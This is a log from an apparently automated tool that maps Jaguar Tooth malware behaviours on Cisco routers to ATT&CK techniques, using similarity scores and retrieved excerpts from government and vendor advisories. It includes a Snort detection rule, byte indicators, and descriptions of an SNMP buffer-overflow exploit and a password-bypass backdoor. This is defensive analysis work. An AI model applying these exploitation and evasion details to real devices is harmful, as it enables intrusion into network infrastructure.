[2025-04-08 17:35:53,197 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [unused/unsupported cloud regions]: tensor([[0.2011]])
[2025-04-08 17:35:53,309 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material]: tensor([[0.4223]])
[2025-04-08 17:35:53,566 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: application access token]: tensor([[0.3709]])
[2025-04-08 17:35:53,714 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: pass the hash]: tensor([[0.3076]])
[2025-04-08 17:35:53,845 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: pass the ticket]: tensor([[0.1777]])
[2025-04-08 17:35:53,948 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [use alternate authentication material: web session cookie]: tensor([[0.3268]])
[2025-04-08 17:35:54,144 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts]: tensor([[0.3704]])
[2025-04-08 17:35:54,268 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: default accounts]: tensor([[0.2585]])
[2025-04-08 17:35:54,505 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: domain accounts]: tensor([[0.2591]])
[2025-04-08 17:35:54,718 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: local accounts]: tensor([[0.2808]])
[2025-04-08 17:35:54,854 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [valid accounts: cloud accounts]: tensor([[0.1902]])
[2025-04-08 17:35:55,030 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3974]])
[2025-04-08 17:35:55,206 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.4260]])
[2025-04-08 17:35:55,350 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.4283]])
[2025-04-08 17:35:55,538 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.3458]])
[2025-04-08 17:35:55,833 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [weaken encryption]: tensor([[0.1793]])
[2025-04-08 17:35:55,958 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [weaken encryption: reduce key space]: tensor([[0.2084]])
[2025-04-08 17:35:56,110 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [weaken encryption: disable crypto hardware]: tensor([[0.3416]])
[2025-04-08 17:35:56,195 INFO] ++ Similarity between [Modify System Image: Patch System Image as used by the malware] and [xsl script processing]: tensor([[0.1061]])
[2025-04-08 17:35:56,223 INFO] ++ Scores: [('modify system image: patch system image', tensor([[0.6984]])), ('modify authentication process: network device authentication', tensor([[0.6454]])), ('modify system image: downgrade system image', tensor([[0.6273]])), ('modify system image', tensor([[0.5955]])), ('hijack execution flow: services file permissions weakness', tensor([[0.5119]]))]
[2025-04-08 17:35:56,223 INFO] ++ Similar techniques found:
['modify system image: patch system image', 'modify authentication process: network device authentication', 'modify system image: downgrade system image', 'modify system image', 'hijack execution flow: services file permissions weakness']
[2025-04-08 17:35:56,224 INFO] ++ Querying the QA model for action Modify System Image: Patch System Image as used by the malware with the following context:
modify system image: patch system image
modify authentication process: network device authentication
modify system image: downgrade system image
modify system image
hijack execution flow: services file permissions weakness
[2025-04-08 17:35:57,486 INFO] ++ QA suggested technique: modify system image: patch system image
[2025-04-08 17:35:57,486 INFO] ++ Selected technique: modify system image: patch system image
[2025-04-08 17:36:01,099 INFO] ++ Refining the action: Modify System Image: Patch System Image as used by the malware using 9 documents:
[Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='d11294e9-bea6-4d96-8c79-bee7bd01138d', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This vulnerability causes a stack -based  buffer to be  overflowed , enabling control of the instruction \npointer  which can be used to  gain remote code execu tion.\n\nThis exploit uses Return Oriented \nProgramming (ROP) to overwrite operating system memory  and incrementally deploy the malware \ncode over hundreds of iterations .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nA successful exploit could allow the attacker to execute arbitrary code and obtain full control of the affected system or cause the affected system to reload.Customers are advised to apply the workaround as contained in the Workarounds section below.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory.Determining the Cisco IOS Software ReleaseTo determine which Cisco\xa0IOS Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.')]
[2025-04-08 17:36:37,692 INFO] ++ Pre-conditions computed for action: Modify System Image: Patch System Image as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(id='64ae615b-bf4f-4d89-825f-249570e863cf', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - CiscoSkip to contentSkip to searchSkip to footerCisco.com WorldwideProducts and ServicesSolutionsSupportLearnExplore CiscoHow to BuyPartners HomePartner ProgramSupportToolsFind a Cisco PartnerMeet our PartnersBecome a Cisco PartnerSupportProduct SupportSNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE SoftwareSaveLog into Save ContentTranslationsPrintAvailable LanguagesUpdated:April 21, 2023Document ID:1498756426900165Bias-Free LanguageBias-Free LanguageThe documentation set for this product strives to use bias-free language.'), Document(id='c0c7f06f-c207-4397-a3d7-de46197789e4', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England DigitalSkip to main contentEnglandDigitalClose menuServicesDataCyberDeveloperNewsAboutMenuSearchClose searchNHS DigitalCyber alerts2023CC-4303State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco RoutersThe UK National Cyber Security Centre (NCSC) along with the United States FBI, NSA and CISA have released a joint advisory describing a 2021 campaign exploiting a known SNMP vulnerability in Cisco IOS and Cisco IOS XE.Threat ID:CC-4303Threat Severity:MediumPublished:19 April 2023 4:38 PMReport a cyber attack: call0300 303 5222or email[email\xa0protected]Page contentsSummaryAffected platformsRemediation adviceDefinitive source of threat updatesCVE VulnerabilitiesSummaryThe UK National Cyber Security Centre (NCSC) along with the United States FBI, NSA and CISA have released a joint advisory describing a 2021 campaign exploiting a known SNMP vulnerability in Cisco IOS and Cisco IOS XE.Affected platformsThe following platforms are known to be affected:Cisco IOSCisco IOS XEThreat detailsIntroductionThe UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal Bureau of Investigation (FBI) have released a joint advisory describing how state-sponsored threat actors (commonly tracked as APT28) successfully exploited Cisco routers during a 2021 campaign using a known Simple Network Management Protocol (SNMP)vulnerability(CVE-2017-6742).CVE-2017-6742 was first disclosed in a Cisco security advisory in June 2017 and relates to abuffer overflowcondition in the SNMP subsystem.'), Document(id='0ee42b9c-0da5-423f-b159-900ed640da0e', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='This malware obtains further device information which is then exfiltrated over trivial file transfer protocol (TFTP) and enables unauthenticated access via a backdoor.The NCSC have attributed the campaign to APT28, whom they assess as "almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165."'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It enables unauthenticated backdoor access by patching Cisco IOS authentication routines .\n\nThis \ngrants access to existing local accounts  without checking the provided password, when connecting \nvia Telnet or physical session .\n\nFurther details are discussed in the ‘Functionality ( Unauthenticated \nbackdoor )’ section of this report.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This vulnerability causes a stack -based  buffer to be  overflowed , enabling control of the instruction \npointer  which can be used to  gain remote code execu tion.\n\nThis exploit uses Return Oriented \nProgramming (ROP) to overwrite operating system memory  and incrementally deploy the malware \ncode over hundreds of iterations .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.')]
[2025-04-08 17:36:50,826 INFO] ++ Post-conditions computed for action: Modify System Image: Patch System Image as used by the malware using 9 documents:
[Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='a39b3687-9747-4484-a6fa-457580873676', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It has been observed being deployed and \nexecuted via exploitation of the patched SNMP vulnerability  CVE-2017 -6742.\n\nMalware details  \nMetadata  \nJaguar Tooth is non -persistent and deployed at various non -contiguous addr esses within Cisco IOS \nmemory .\n\nThe code and data ha ve been extracted from network traffic and a s such there is  no \nstandard metadata for this malware to include .'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Tactic  ID Technique  Procedure  \nDefense Evasion  T1556  Modify Authentication \nProcess  Jaguar Tooth patches two \nauthentication functions to grant \naccess to local accounts for \nTelnet and physical sessions, \nwithout chec king the provided \npassword.\n\nT1601.001  Modify System Image : \nPatch System Image  Jaguar Tooth patches the \nsystem image in memory to \nenable a user authentication \nbypass.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Further details are discussed in the ‘Function ality (Device information exfiltration) ’ section of this \nreport.\n\nUnauthenticated backdoor  \nJaguar Tooth modifies the system’s authentication process, allowing unauthenticated access to any \nlocal account for any provided p assword via Telnet and physical sessions.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='It enables unauthenticated backdoor access by patching Cisco IOS authentication routines .\n\nThis \ngrants access to existing local accounts  without checking the provided password, when connecting \nvia Telnet or physical session .\n\nFurther details are discussed in the ‘Functionality ( Unauthenticated \nbackdoor )’ section of this report.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This vulnerability causes a stack -based  buffer to be  overflowed , enabling control of the instruction \npointer  which can be used to  gain remote code execu tion.\n\nThis exploit uses Return Oriented \nProgramming (ROP) to overwrite operating system memory  and incrementally deploy the malware \ncode over hundreds of iterations .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.')]
[2025-04-08 17:36:55,403 INFO] ++ Indicators computed for action: Modify System Image: Patch System Image as used by the malware. The indicators are:
['The content contains "| 03   81   60   00   0 8 |".', 'The content contains "| 24   02   00   0 1 |".']
[2025-04-08 17:37:47,484 INFO] Processing step relative to tactic: discovery
[2025-04-08 17:37:47,484 INFO] + Processing action: Remote System Discovery as used by the malware
[2025-04-08 17:37:47,731 INFO] ++ Embedding computed for: Remote System Discovery as used by the malware. The vector has shape: (384,)
[2025-04-08 17:37:47,911 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery]: tensor([[0.4000]])
[2025-04-08 17:37:48,125 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: local account]: tensor([[0.4239]])
[2025-04-08 17:37:48,212 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.3558]])
[2025-04-08 17:37:48,404 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: email account]: tensor([[0.2854]])
[2025-04-08 17:37:48,629 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.2990]])
[2025-04-08 17:37:48,841 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [application window discovery]: tensor([[0.4494]])
[2025-04-08 17:37:49,022 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [browser information discovery]: tensor([[0.3649]])
[2025-04-08 17:37:49,169 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.3565]])
[2025-04-08 17:37:49,266 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.2476]])
[2025-04-08 17:37:49,453 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud service discovery]: tensor([[0.3668]])
[2025-04-08 17:37:49,674 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.3665]])
[2025-04-08 17:37:49,875 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3559]])
[2025-04-08 17:37:50,029 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [debugger evasion]: tensor([[0.3478]])
[2025-04-08 17:37:50,188 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [device driver discovery]: tensor([[0.5098]])
[2025-04-08 17:37:50,317 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [domain trust discovery]: tensor([[0.3222]])
[2025-04-08 17:37:50,414 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [file and directory discovery]: tensor([[0.4278]])
[2025-04-08 17:37:50,648 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [group policy discovery]: tensor([[0.3578]])
[2025-04-08 17:37:50,830 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [log enumeration]: tensor([[0.4096]])
[2025-04-08 17:37:51,014 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [network service discovery]: tensor([[0.6064]])
[2025-04-08 17:37:51,196 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [network share discovery]: tensor([[0.4070]])
[2025-04-08 17:37:51,318 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [network sniffing]: tensor([[0.3567]])
[2025-04-08 17:37:51,493 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [password policy discovery]: tensor([[0.3160]])
[2025-04-08 17:37:51,691 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.4915]])
[2025-04-08 17:37:51,944 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery]: tensor([[0.4073]])
[2025-04-08 17:37:52,136 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.4116]])
[2025-04-08 17:37:52,281 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3591]])
[2025-04-08 17:37:52,453 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3267]])
[2025-04-08 17:37:52,586 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [process discovery]: tensor([[0.4979]])
[2025-04-08 17:37:52,684 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [query registry]: tensor([[0.4540]])
[2025-04-08 17:37:52,892 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [remote system discovery]: tensor([[0.6322]])
[2025-04-08 17:37:53,047 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [software discovery]: tensor([[0.5100]])
[2025-04-08 17:37:53,222 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.5404]])
[2025-04-08 17:37:53,337 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system information discovery]: tensor([[0.5413]])
[2025-04-08 17:37:53,494 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system location discovery]: tensor([[0.4928]])
[2025-04-08 17:37:53,663 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.5030]])
[2025-04-08 17:37:53,772 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.5983]])
[2025-04-08 17:37:53,934 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.5489]])
[2025-04-08 17:37:54,117 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.5912]])
[2025-04-08 17:37:54,247 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system network connections discovery]: tensor([[0.6069]])
[2025-04-08 17:37:54,472 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.4961]])
[2025-04-08 17:37:54,617 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system service discovery]: tensor([[0.5432]])
[2025-04-08 17:37:54,855 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [system time discovery]: tensor([[0.3879]])
[2025-04-08 17:37:54,977 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3307]])
[2025-04-08 17:37:55,151 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3393]])
[2025-04-08 17:37:55,287 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3415]])
[2025-04-08 17:37:55,486 INFO] ++ Similarity between [Remote System Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.2459]])
[2025-04-08 17:37:55,493 INFO] ++ Scores: [('remote system discovery', tensor([[0.6322]])), ('system network connections discovery', tensor([[0.6069]])), ('network service discovery', tensor([[0.6064]])), ('system network configuration discovery', tensor([[0.5983]])), ('system network configuration discovery: wi-fi discovery', tensor([[0.5912]]))]
[2025-04-08 17:37:55,493 INFO] ++ Similar techniques found:
['remote system discovery', 'system network connections discovery', 'network service discovery', 'system network configuration discovery', 'system network configuration discovery: wi-fi discovery']
[2025-04-08 17:37:55,493 INFO] ++ Querying the QA model for action Remote System Discovery as used by the malware with the following context:
remote system discovery
system network connections discovery
network service discovery
system network configuration discovery
system network configuration discovery: wi-fi discovery
[2025-04-08 17:37:56,601 INFO] ++ QA suggested technique: remote system discovery
[2025-04-08 17:37:56,601 INFO] ++ Selected technique: remote system discovery
[2025-04-08 17:38:00,073 INFO] ++ Refining the action: Remote System Discovery as used by the malware using 8 documents:
[Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(id='a9b66a24-df7c-4186-9e83-209a80f9824f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(id='8c211639-4e6c-4846-9e3a-11af6b76f5f9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Rule type  Snort  \nalert udp  any 161 -> any 161 (msg:"Jaguar Tooth payload deployment"; \\ \n                content:"|2b 06 01 04 01 09 09 5f 01 02 04 01 03|"; \\ \n                content:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAdisa"; distance:1; \nwithin:32; fast_pattern; \\ \n                sid:23041 8004; rev:1; classtype:misc -attack;\\ \n    metadata:date 2023 -04-18;)  \n \n \nDescription  This signature detects the Jaguar Tooth payload patch deployment.'), Document(id='949f0be8-1a20-429a-a064-96058d815fd5', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Exceptions may be present in the documentation due to language that is hardcoded in the user interfaces of the product software, language used based on RFP documentation, or language that is used by a referenced third-party product.Learn moreabout how Cisco is using Inclusive Language.Cisco Security AdvisorySNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE SoftwareHighAdvisory ID:cisco-sa-20170629-snmpFirst\xa0Published:2017\xa0June\xa029\xa016:00\xa0GMTLast\xa0Updated:2023\xa0April\xa021\xa017:45\xa0GMTVersion\xa01.10:FinalWorkarounds:YesCisco Bug IDs:CSCsy56638CSCve54313CSCve57697More...,CSCsy56638,CSCve54313,CSCve57697,CSCve60276,CSCve60376,CSCve60402,CSCve60507,CSCve66540,CSCve66601,CSCve66658,CSCve78027,CSCve89865CVE-2017-6736CVE-2017-6737CVE-2017-6738More...CVE-2017-6736,CVE-2017-6737,CVE-2017-6738,CVE-2017-6739,CVE-2017-6740,CVE-2017-6741,CVE-2017-6742,CVE-2017-6743,CVE-2017-6744CWE-119CWE-119CVSS\xa0Score:Base 8.8, \n                                          Temporal 8.2Click Icon to Copy Verbose ScoreCVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:CCVE-2017-6736CVE-2017-6737CVE-2017-6738More...CVE-2017-6736,CVE-2017-6737,CVE-2017-6738,CVE-2017-6739,CVE-2017-6740,CVE-2017-6741,CVE-2017-6742,CVE-2017-6743,CVE-2017-6744CWE-119CWE-119Download CSAFDownload OVALCVE-2017-6744CVE-2017-6743CVE-2017-6738CVE-2017-6736CVE-2017-6740EmailSummaryThe Simple Network Management Protocol\xa0(SNMP) subsystem of Cisco IOS and IOS XE Software contains multiple vulnerabilities that could allow an authenticated, remote attacker to remotely execute code on an affected system or cause an affected system to reload.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.ConclusionAPT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.TTPs in this advisory may still be used against vulnerable Cisco devices.'), Document(metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='Successful exploitation could allow an authenticated, remote attacker toexecute arbitrary codeand obtain full control of the affected system or cause the affected system to reload.In the 2021 campaign detailed by the NCSC, threat actors exploited CVE-2017-6742 to perform reconnaissance, enumerate router interfaces and deploy custom malware known as "Jaguar Tooth", as detailed in theNCSC’s Jaguar Tooth malware analysis report.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='An attacker could exploit these vulnerabilities by sending a crafted SNMP packet to an affected device via IPv4 or IPv6.\n\nOnly traffic directed to the affected system can be used to exploit these vulnerabilities.To exploit these vulnerabilities via SNMP Version 2c or earlier, the attacker must know the SNMP read-only community string for the affected system.')]
[2025-04-08 17:38:19,002 INFO] ++ Pre-conditions computed for action: Remote System Discovery as used by the malware using 8 documents:
